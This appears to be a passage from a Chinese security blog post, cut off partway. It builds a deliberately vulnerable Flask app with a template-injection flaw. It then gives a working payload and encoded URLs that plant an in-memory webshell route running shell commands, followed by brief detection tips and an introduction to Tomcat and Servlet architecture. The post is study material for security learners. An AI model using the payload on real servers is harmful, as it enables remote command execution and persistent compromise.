<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">from</span> functools import partial<br> <br>def <span class="hljs-keyword">mod</span>( n, m ):<br>  <span class="hljs-keyword">return</span> n % m<br> <br>mod_by_10 = partial( <span class="hljs-keyword">mod</span>, m=<span class="hljs-number">10</span> )<br> <br><span class="hljs-keyword">print</span> <span class="hljs-keyword">mod</span>( <span class="hljs-number">77</span>,<span class="hljs-number">10</span> )  <span class="hljs-meta"># 7</span><br><span class="hljs-keyword">print</span> mod_by_10( <span class="hljs-number">77</span> )  <span class="hljs-meta"># 7</span><br></code></pre></td></tr></table></figure>

<p><code>mod(n,m)</code>表示n模m，是个通用函数，但是如果我只是用模10，需要每次都指定m&#x3D;10吗？偏函数的功能就是解决这个问题，我们可以在<code>mod(n,m)</code>重新命令一个函数<code>mod_by_100(n)</code>，由于他是有<code>mod(n,m)</code>扩展来的，所以需要指定参数<code>m=100</code>，<code>mod_by_100 = partial( mod, 100 )</code>，第一个参数mod就是扩展原函数<code>mod(n,m)</code>，原函数的各个参数依次作为<code>partial()</code>函数后续的参数，除非使用关键字参数。</p>
<h3 id="实战步骤"><a href="#实战步骤" class="headerlink" title="实战步骤"></a><strong>实战步骤</strong></h3><p>简单编写一个flask sstl实例，内容是访问&#x2F;index加上content参数就会被渲染，渲染的content和name内容是用户可控，利用这点生成内存马。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, url_for, redirect, request, render_template_string<br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/index&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>():<br>    content = request.args.get(<span class="hljs-string">&quot;content&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application&#x27;s code here</span><br>    person = <span class="hljs-string">&#x27;knave&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hi/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hi</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello flask!&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure>

<p><strong>原始Flask内存马payload</strong></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<br>	<span class="hljs-comment">&quot;app.add_url_rule(</span><br>		<span class="hljs-string">&#x27;/shell&#x27;</span>, <br>		<span class="hljs-string">&#x27;shell&#x27;</span>, <br>		lambda :__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;cmd&#x27;</span>)).<span class="hljs-keyword">read</span>()<br>		)<br>	<span class="hljs-comment">&quot;,</span><br>	&#123;<br>		<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<br>		<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]<br>	&#125;<br>)<br></code></pre></td></tr></table></figure>

<p>payload解析</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__class__</span>：返回调用的参数类型<br><br><span class="hljs-variable">__bases__</span>：返回基类列表<br><br><span class="hljs-variable">__builtins__</span>：内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-<span class="hljs-built_in">in</span> 函数，例如eval, <span class="hljs-built_in">exec</span>, open等<br><br><span class="hljs-variable">__globals__</span>：以字典的形式返回函数所在的全局命名空间所定义的全局变量,这里的函数可以是类class的构造函数如<span class="hljs-variable">__init__</span>,也可以是flask的函数如url_for等。<br></code></pre></td></tr></table></figure>

<p><code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code></p>
<p>url_for是Flask的一个内置函数：作用是根据函数名称和已有规则生成对应url。</p>
<p><img src="https://img-blog.csdnimg.cn/06dd557080dc4a538085154b10e7f015.png" srcset="/img/loading.gif" lazyload alt="image-20220610172705958"></p>
<p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p>
<p><img src="https://img-blog.csdnimg.cn/e707a90064db430089a5275bcf85a821.png" srcset="/img/loading.gif" lazyload alt="image-20220610181036433"></p>
<p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的。</p>
<p><img src="https://img-blog.csdnimg.cn/8183b93a3a084666831279f71d9b9bf5.png" srcset="/img/loading.gif" lazyload alt="image-20220610181116081"></p>
<p>直接调用就能执行命令了，但是命令输出并未回显而是显示在终端中</p>
<p><img src="https://img-blog.csdnimg.cn/45b0e83a4b484d339bb2b03bccfb9e25.png" srcset="/img/loading.gif" lazyload alt="image-20220610181636124"></p>
<p><img src="https://img-blog.csdnimg.cn/a4b3f63351f74c5980145d832fe8fb70.png" srcset="/img/loading.gif" lazyload alt="image-20220610181724351"></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<br>	<span class="hljs-comment">&quot;app.add_url_rule(</span><br>		<span class="hljs-string">&#x27;/shell&#x27;</span>, <br>		<span class="hljs-string">&#x27;shell&#x27;</span>, <br>		lambda :__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;cmd&#x27;</span>)).<span class="hljs-keyword">read</span>()<br>		)<br>	<span class="hljs-comment">&quot;,</span><br>	&#123;<br>		<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<br>		<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]<br>	&#125;<br>)<br></code></pre></td></tr></table></figure>

<p>add_url_rule()添加了一个url为&#x2F;shell的路由，绑定匿名函数<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;)).read()</code></p>
<p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例。</p>
<p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p>
<p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>. <code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>. <code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>.</p>
<p>eval基本用法</p>
<p><img src="https://img-blog.csdnimg.cn/539d27ecc22f4e6891a478530328c717.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p><strong>访问如下URL生成Flask内存马：</strong></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">5000</span>/<span class="hljs-keyword">index</span>?content=&#123;&#123;a.__init__.__globals__[<span class="hljs-variable">%27__builtins_</span>_<span class="hljs-variable">%27</span>][<span class="hljs-variable">%2</span>7eval<span class="hljs-variable">%27</span>](<span class="hljs-variable">%22app</span>.add_url_rule(<span class="hljs-variable">%27</span>/shell1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7shell<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0lambda<span class="hljs-variable">%20</span>:__import__(<span class="hljs-variable">%2</span>7os<span class="hljs-variable">%27</span>).popen(_request_ctx_stack.top.request.args.get(<span class="hljs-variable">%2</span>7cmd<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7whoami<span class="hljs-variable">%27</span>)).read())<span class="hljs-variable">%22</span>,<span class="hljs-variable">%20</span>&#123;<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>:<span class="hljs-variable">%20url_for</span>.__globals__[<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>],<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7app<span class="hljs-variable">%27</span>:<span class="hljs-variable">%20url_for</span>.__globals__[<span class="hljs-variable">%27current</span>_app<span class="hljs-variable">%27</span>]&#125;)&#125;&#125;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">5000</span>?name=&#123;&#123;url_for.__globals__[<span class="hljs-variable">%27__builtins_</span>_<span class="hljs-variable">%27</span>][<span class="hljs-variable">%2</span>7eval<span class="hljs-variable">%27</span>](<span class="hljs-string">&quot;app.add_url_rule(<span class="hljs-variable">%27</span>/shell<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7shell<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0lambda<span class="hljs-variable">%20</span>:__import__(<span class="hljs-variable">%2</span>7os<span class="hljs-variable">%27</span>).popen(_request_ctx_stack.top.request.args.get(<span class="hljs-variable">%2</span>7cmd<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7whoami<span class="hljs-variable">%27</span>)).read())&quot;</span>,&#123;<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>:url_for.__globals__[<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>],<span class="hljs-variable">%2</span>7app<span class="hljs-variable">%27</span>:url_for.__globals__[<span class="hljs-variable">%27current</span>_app<span class="hljs-variable">%27</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1:5000/shell1?cmd=<span class="hljs-built_in">id</span><br>http://127.0.0.1:5000/shell?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/63f7ad2bcda0490391536a3d91e22c41.png" srcset="/img/loading.gif" lazyload alt="image-20220609212421796"></p>
<h3 id="检测思路-1"><a href="#检测思路-1" class="headerlink" title="检测思路"></a>检测思路</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> 查 看 所 有 内 建 模 块 中 是 否 包 含 <span class="hljs-built_in">eval</span> 、 <span class="hljs-built_in">exec</span> 等 可 以 执 行 代 码 的 函 数 如 ： <span class="hljs-keyword">class</span>‘warnings.catch_warnings’、<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>等。<br><span class="hljs-number">2.</span> 检测<span class="hljs-variable language_">self</span>.add_url_rule()中特殊名字的路由如shell等。<br></code></pre></td></tr></table></figure>

<h2 id="Tomcat架构学习"><a href="#Tomcat架构学习" class="headerlink" title="Tomcat架构学习"></a>Tomcat架构学习</h2><h3 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h3><p><strong>Tomcat</strong>是由Apache软件基金会属下Jakarta项目开发的Servlet容器，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。</p>
<h3 id="Tomcat架构"><a href="#Tomcat架构" class="headerlink" title="Tomcat架构"></a>Tomcat架构</h3><p><img src="https://img2020.cnblogs.com/blog/1511657/202110/1511657-20211021113259065-983482909.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/431aa08e5b5845289cd7993db4f43527.png" srcset="/img/loading.gif" lazyload alt="112a8d88bf72526f701c09b4b97fd5f7.png"></p>
<p>​		Tomcat架构采用类似于俄罗斯套娃的设计方式。换句话说就是一个容器包含一个容器，而这个被包含的容器反过来再包含别的实体。Tomcat将Engine，Host，Context，Wrapper统一抽象成容器(Container)。一个抽象的容器模块可以包含各种服务。</p>
<p><strong>容器组件</strong></p>
<ul>
<li>Server组件：Server是最顶级的组件，一个Tomcat对应一个Server，Server代表tomcat的运行实例，其中包含Listener组件用以监听生命周期中的各种事件；包含Global Naming Resources组件用以集成JNDI；包含Service组件用以提供服务。</li>
<li>Service组件：Service是服务的抽象，代表请求从接受到处理的所有组件的集合；Server组件可以包含多个Service组件；包含Connector组件用以接收客户端的信息；包含Engine组件用以处理请求；包含Executor用以提供线程池执行任务。<strong>一个Service包含多个connector(接受请求的协议)，和一个container(容器)，多个connector共享一个container容器。</strong></li>
<li>Connector组件：负责接受客户端连接并接受信息报文，解析不同协议及io方式。包含Mapper组件对请求地址进行路由；包含CoyoteAdaptor组件用以将Connector组件和Engine等容器组件适配；</li>
<li>Executor组件：线程池</li>
<li>Engine组件：Servlet引擎，container容器中顶层的容器对象，用来管理多克虚拟站点，包含Listener组件用以在生命周期中对Engine相关的事件进行监听；包含AccessLog组件以记录访问日志；包含Cluster组件以提供集群功能，将需要共享的数据同步到集群中的其他Tomcat实例中；包含Pipeline组件用以处理请求；包含Realm组件用以提供安全权限功能。<strong>一个Service最多只有一个Engine，但一个engine可以包含多个host主机。</strong></li>
<li>Host组件：代表一个虚拟主机，或者说一个站点，可以给Tomcat配置多个虚拟主机地址，而一个虚拟主机下可包含多个Context。Host包含Listener组件用以在生命周期中对Host相关的事件进行监听；包含AccessLog组件以记录访问日志；包含Cluster组件以提供集群功能，将需要共享的数据同步到集群中的其他Tomcat实例中；包含Pipeline组件用以处理请求；包含Realm组件用以提供安全权限功能。<strong>一个host对应一个网络域名，一个host包含多个context。</strong></li>
<li>Context组件：Web应用抽象，Web应用部署tomcat后会转换为Context对象；包含了各种静态资源、若干Servlet（Wrapper容器）以及各种其他动态资源。<strong>contest表示一个Web应用，一个web应用可包含多克Wrapper</strong></li>
<li>Mapper组件用以作为路由映射Servlet。</li>
<li>Wrapper组件：表示一个Servlet，负责管理整个Servlet的生命周期，包括装载、初始化、资源回收等；包含Web应用开发常用的Servlet组件；包含ServletPool组件用以存放Servlet对象。<strong>web应用中的servlet会被包装成一个wrapper。</strong></li>
</ul>
<p>可以用一张图来表示请求在Container中的解析过程：</p>
<p><img src="https://img-blog.csdnimg.cn/2c9a1c8f824d43ecb80632cc8b09e642.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>Tomcat将请求路由到具体的Serclet的过程是交给Mapper组件来完成的。Mapper组件里面会保存着Tomcat应用的各种配置信息，例如Host域名、Context路径等。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>根据请求协议各端口号路由到相应的Service，找到Service对应唯一的Engine容器。<br><span class="hljs-number">2.</span>更与域名地址找到相应的Host容器。<br><span class="hljs-number">3.</span>根据URL路径匹配某一个Context组件。<br><span class="hljs-number">4.</span>最后根据URL匹配到某一个<span class="hljs-keyword">Wrapper</span>，也就是Servlet。<br></code></pre></td></tr></table></figure>

<h3 id="JavaWeb三大组件"><a href="#JavaWeb三大组件" class="headerlink" title="JavaWeb三大组件"></a>JavaWeb三大组件</h3><h4 id="Servlet组件"><a href="#Servlet组件" class="headerlink" title="Servlet组件"></a>Servlet组件</h4><p>Servlet是用来处理客户端请求的动态资源，当Tomcat接收到来自客户端的请求时，会将其解析成RequestServlet对象并发送到对应的Servlet上处理。</p>
<p>Servlet组件有<code>javax.servlet.Servlet</code>类实现，由<code>init</code>、<code>getServletConfig</code>、<code>service</code>、<code>getServletInfo</code>，<code>destory</code>方法构成。</p>
<p><img src="https://img-blog.csdnimg.cn/6f604d5056ef4a2d8286b50136c82502.png" srcset="/img/loading.gif" lazyload alt="image-20221123230434457"></p>
<h5 id="Servlet的生命周期"><a href="#Servlet的生命周期" class="headerlink" title="Servlet的生命周期"></a>Servlet的生命周期</h5><p><strong>Servlet的生命周期分如下五个阶段</strong></p>
<ul>
<li>加载：当Tomcat第一次访问Servlet时，Tomcat会负责创建Servlet的实例</li>
<li>初始化：Tomcat创建Servlet后，调用<code>init()</code>方法初始化对象</li>
<li>服务：当浏览器访问Servlet时，Servlet会调用<code>service()</code>处理请求</li>
<li>销毁：当Tomcat关闭时或检测到Servlet从Tomcat删除时会调用<code>destory()</code>方法。</li>
<li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li>
</ul>
<p>为了简化操作，Tomcat帮我们封装了<code>javax.servlet.http.HttpServlet</code>类，其中包括<code>doGet</code>、<code>doPost</code>等方法。对于简单的HTTP请求，我们只需要重载响应的方法即可，例如get方法重载<code>doGet()</code>。</p>
<p><img src="https://img-blog.csdnimg.cn/31ccc0840f1d47bc8363516ad34c19c0.png" srcset="/img/loading.gif" lazyload alt="image-20221123230835655"></p>
<h5 id="Servlet样例"><a href="#Servlet样例" class="headerlink" title="Servlet样例"></a>Servlet样例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/example/demo/Login.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebServlet(&quot;/password&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;欢迎登陆&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// String getMethod():获取请求方式：GET</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        printWriter.write(<span class="hljs-string">&quot;&lt;pre&gt;&lt;h3&gt;&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> req.getMethod();<br>        printWriter.write(<span class="hljs-string">&quot;method:&quot;</span> + method);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-comment">// String getContextPath():获取虚拟目录(项目访问路径)：/webapp</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">contextPath</span> <span class="hljs-operator">=</span> req.getContextPath();<br>        printWriter.write(<span class="hljs-string">&quot;contextPath:&quot;</span> + contextPath);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-comment">// StringBuffer</span><br>        <span class="hljs-comment">// getRequestURL():获取URL(统一资源定位符)：http://localhost:8080/webapp/Login</span><br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> req.getRequestURL();<br>        printWriter.write(<span class="hljs-string">&quot;url:&quot;</span> + url.toString());<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-comment">// String getRequestURI()：获取URI(统一资源标识符)： /webapp/Login</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> req.getRequestURI();<br>        printWriter.write(<span class="hljs-string">&quot;uri:&quot;</span> + uri);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-comment">// String getQueryString()：获取请求参数（GET方式）： username=admin</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queryString</span> <span class="hljs-operator">=</span> req.getQueryString();<br>        printWriter.write(<span class="hljs-string">&quot;queryString:&quot;</span> + queryString);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>        printWriter.write(message);<br>        printWriter.write(<span class="hljs-string">&quot;&lt;/h3&gt;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        resp.getWriter().write(<span class="hljs-string">&quot;Post方法&quot;</span> + message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上述代码在<code>/password</code>路径中创建了名为<code>Login</code>的Servlet，项目名称为webapp，访问<code>http://localhost:8080/webapp/password</code>，成功调用<code>doGet</code>方法。</p>
<p><img src="https://img-blog.csdnimg.cn/49fdc1f5acba49d6a01ec9b33b40f5d9.png" srcset="/img/loading.gif" lazyload alt="image-20221123231446703"></p>
<p><strong>值得注意的是</strong>，在代码中我们使用了<code>@WebServlet(&quot;/password&quot;)</code>注解进行Servlet注册，对Servlet进行路由绑定，任何访问<code>password</code>的请求都将传递给<code>Login</code>类进行处理。当然<code>@WebServlet</code>是servlet3.0以后支持的方式，如果servlet低于3.0，我们仍然需要使用web.html进行配置，为了与上面区分，下面的<code>web.html</code>将<code>/Login</code>的路径绑定至Login类上。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span 